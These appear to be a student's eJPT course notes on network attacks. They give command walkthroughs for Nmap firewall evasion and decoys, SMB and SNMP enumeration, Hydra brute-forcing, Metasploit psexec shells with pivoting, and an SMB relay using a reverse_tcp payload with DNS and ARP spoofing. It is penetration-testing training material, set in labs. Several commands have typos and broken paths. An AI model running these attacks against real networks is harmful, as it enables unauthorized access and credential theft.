[[Root 𖣂]] - [[eJPT - README]]

> Course File - [[07 - Network - Based Attacks.pdf]]

<hr>

# Network-Based Attacks

<br>

## 1. Networking

### 1.1. Firewall Detection & IDS Evasion

The object of this section is going to revolve around how you can use Nmap to detect the presence of a host based firewall, or the presence of a filtering mechanism. Improve Nmap scan in order to detect a firewall and evade it.

**Detect Firewalls**

```shell
nmap -sA <target_IP> # ACK scan to detect firewall presence
nmap -Pn -sS -F <target_IP> # Stealth SYN scan on common ports
nmap -Pn -sS -F -p 445,3389 <target_IP> # Target specific ports
# Check Port Status: Look for filtered or unfiltered results.
```

**Evade Firewalls**

```shell
nmap -Pn -sS -sV -F -f -p 80,445,3389 <target_IP> # Fragment packets
nmap -Pn -sS -sV -F -f --mtu 32 <target_IP> # Manipulate packet size
```

**IP Spoofing and Decoy**
- IP Spoofing is a technique where an attacker falsifies the source IP address in packet headers to make it appear as if the traffic is coming from another machine. 
- Decoy scanning is an Nmap feature that sends packets from multiple fake IP addresses along with your real IP. This confuses intrusion detection systems (IDS) and firewalls, making it difficult for the target to identify the real attacker.

```shell
nmap -Pn -sS -sV -p 445,3389 -f --data-length 200 -D <gateway-IP-1>,<gateway-IP-2> <target-IP> # Use decoys
nmap -Pn -sS -sV -p 445,3389 -f --data-length 200 -g 53 -D <gateway-IP-1>,<gateway-IP-2> <target-IP> # Spoof port 53
```

<br>

## 2. Networks Attacks

### 2.1. SMB & NetBIOS Enumeration ⚗️



```shell
cat /etc/hosts
ping -c 1 demo.ine.local
ping -c 1demo1.ine.local # Not reachable
nmap -sV -O demo.ine.local
# By default, the SMB service uses either IP port 139 or 445.
```

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc. In this lab, we will perform attacks on the SMB service.

The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. SMB can also communicate with any server program that is set up to receive an SMB client request.

**445/tcp open microsoft-ds**
- Means that port 445 is open on the target system and is running the Microsoft Directory Services (microsoft-ds) protocol.
- Port 445 (TCP) is used by Microsoft-DS (Directory Services) for file and printer sharing over a network.
- It primarily handles SMB (Server Message Block) protocol, which enables file sharing, network browsing, and inter-process communication (IPC) on Windows systems.
- SMB over port 445 is a core component of Windows networking services.

**Security Risks Associated with Port 445**
- EternalBlue (MS17-010)
- SMB Relay Attacks
- SMB Ghost (CVE-2020-0796)

```shell
nmap -sV -p 139, 445 demo.ine.local
ls /usr/share/nmap/scripts/ | grep smb

# Now, let's identify all the supported SMB versions on the target machine.
nmap -p445 --script smb-protocols demo.ine.local
# We can notice that all three versions are accessible.

# Let's run the nmap script to find the smb protocol security level.
nmap -p445 --script smb-security-mode demo.ine.local

# Let's run the smbclient tool to find that we have anonymous access on the target machine.
smbclient -L  demo.ine.local
# We can access the target using anonymous login.
```

We can access the target using anonymous login. Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script. 

```shell
nmap -p445 --script smb-enum-users.nse  demo.ine.local
# There are a total of four users present. admin, administrator, root, and guest.

# Now, let's find the valid password for admin, administrator, and root user.
vim users.txt
admin
administrator
root
```

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

```shell
hydra 
-L 
users.txt 
-P 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
<target_IP> 
smb
```

Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.

```shell
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit

getuid
sysinfo

shell
dir C:\ /s /b | findstr /i flag
# Searches for files and folders containing the word "flag" (case-insensitive) anywhere in their name across the entire C:\ drive.

# Now, let's ping to the second target and verify that it is reachable from the second machine.
# We can access the demo1.ine.local machine.
```

Here we need to perform pivoting by adding route from the Metasploit framework.
Let's add the route using the meterpreter session and identify the second machine service.

```shell
run autoroute -s <second_target_IP><netmask>
# This command is used in the Meterpreter session within the Metasploit Framework. It sets up a route through a compromised machine to access other networks that are not directly reachable from the attacker's machine.

# We have successfully added the route to access the demo1.ine.local machine.
```

Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
First start the socks4a server using the Metasploit module.

```shell
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. demo1.ine.local. We could also specify multiple ports. But, in this case, we are only interested in SMB service.

```shell
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

Now, let's use the net view command to find all resources shared by the demo1.ine.local machine.
Now, we can map the shared drive to the demo.ine.local machine using the' net' command.
Let's map the shared resources, i.e., the Documents and K drive.

```shell
net use D: \\<target_2_IP>\Documents 
net use K: \\<target_2_IP>\K$
```

We successfully mapped the resources to D and K drives.
Let's check what is inside these mapped drives.

```shell
# Interact with the meterpreter session again.
sessions -i 1
shell
net view <second_target_IP>

# We have received the Access is denied. message.
# Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.
migrate -N explorer.exe
shell
net view <second_target_IP>
```

This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (demo1.ine.local) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

```shell
dir D:
dir K:
# Get the flags and the task is sompleted. Back to meterpreter session
cd D:\\ 
download Confidentia.txt
download FLAG2.txt
```

<br>

### 2.2. SNMP Enumeration ⚗️

SNMP (Simple Network Management Protocol) is a network protocol used for monitoring, managing, and configuring devices like routers, switches, servers, and printers over IP networks. It enables network administrators to collect information, detect faults, and configure network devices remotely through a management system.

In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.

**Objective**: Exploit the target to gain the shell and find the flag!
The best tools for this lab are:
- Nmap
- Metasploit Framework
- snmpwalk
- Hydra

```shell
cat /etc/hosts
ping -c 1 demo.ine.local
nmap <taget_IP>
```

We can notice, multiple ports are open on the target machine. Now, let's check if the SNMP port is open or not. We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161. 

```shell
nmap -sU -p 161 demo.ine.local
# As we can see, the UDP port 161 is open. This information is crucial for our following tasks.

ls /usr/share/nmap/scripts/ | grep snmp
ls -al /usr/share/nmap/scripts/ | grep snmp # -al > All files | Long listing format

nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
# The above command would run all the nmap SNMP scripts on the target machine and store its output to the snmp_output file.

nmap -sU -p 161 --script snmp-brute <target_IP>
# As we can see, we found three community names: public, private, and secret

nmap --script-help snmp-win32-users
# Attempts to enumerate Windows user accounts through SNMP

nmap -sU -p 161 --script snmp-win32-users demo.ine.local
# snmp-win32-users: Administrator, DefaultAccount, Guest, WDAGUtilityAccount, admin
```

Now, let's run a brute-force attack using these windows users on SMB service. The port 445 is open, and we can run a brute-force attack using the hydra tool.

```shell
hydra 
-l 
administrator  
-P 
/usr/share /metasplout-framewords/data/wordlists/unix_passwords.txt 
<target_IP> 
smb 
# We can now authenticate via psexec or we can use the metasploit module.

msfconsole -q
search smb psexec
use xploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit

# shell
shell
dir C:\ /s /b | findstr /i flag

# meterpreter
cd C:\
cat FLAG1.txt
```

<br>

### 2.3. SMB Relay Attack ⚗️

The assumptions of this security engagement are:
- You are going to do an internal penetration test, where you will be connected directly into their LAN network 172.16.5.0/24. The scope in this test is only the 172.16.5.0/24 segment.
- You are in a production network, so you should not lock any user account by guessing their usernames and passwords.

**Goals**: 
- Exploitation using SMB Relay Attack
- Manipulating network traffic with dnsspoof

![[Pasted image 20250223160924.png]]

Launch an attack using the SMB Relay Exploit in a way that once the Client (172.16.5.5) issues a SMB connection to any hosts on the .sportsfoo.com domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (172.16.5.10).

**Step 1:** Start **msfconsole** and configure the SMB Relay exploit: **Commands:**

```shell
service postgresql start && msfconsole
search  smb_relay
use exploit/windows/smb/smb_relay
show options
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

**Step 2:** Configure dnsspoof

```shell
# In order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain, create a file with fake dns entry with all subdomains of sportsfoo.com pointing to our attacker machine.

echo "172.16.5.101 *.sportsfoo.com" > dns
# We are ready to run.
dnsspoof -i eth1 -f dns

# How move on to setting up the man in the middle attack and we'll utilize ops spoofing and our goal is to poison the traffic between our victim which is the Windows 7 system and the default gateway.
echo 1 > /proc/sys/net/ipv4/ip_forward
# In one terminal
arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP> # without -r

# In another terminal
arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP> 

# Every time the victim system or the wiondows 7 starts on SMB connection DNS spoof aligned with the ops spoofing attack forgets the DNS replies telling that the DNS address that they're looking for resolves to the Kali Linux system.
exploit # metasploit
jobs

sessions
getuid
```
